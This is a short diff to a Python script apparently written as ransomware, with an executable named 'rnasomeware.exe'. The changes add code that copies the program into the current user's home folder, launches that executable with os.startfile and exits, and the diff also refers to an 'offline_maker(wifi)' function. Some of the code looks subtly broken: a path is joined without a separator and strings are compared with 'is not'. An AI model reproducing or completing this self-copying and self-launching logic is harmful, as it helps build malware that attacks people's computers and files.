@@ -11,7 +11,7 @@ from multiprocessing import Process
 main_file_directory = os.getcwd()
 user_name = os.getenv('username')
 destination_directory = "C://Users//" + user_name
-destination_directory_under = destination_directory
+executable_file_directory = destination_directory + "rnasomeware.exe"
 sha_256 = hashlib.sha256
 
 
@@ -60,6 +60,7 @@ def offline_maker(wifi):
 
 if main_file_directory is not destination_directory:
     shutil.copy(main_file_directory,destination_directory)
+    os.startfile(executable_file_directory)
     exit()
 
 elif main_file_directory is destination_directory:
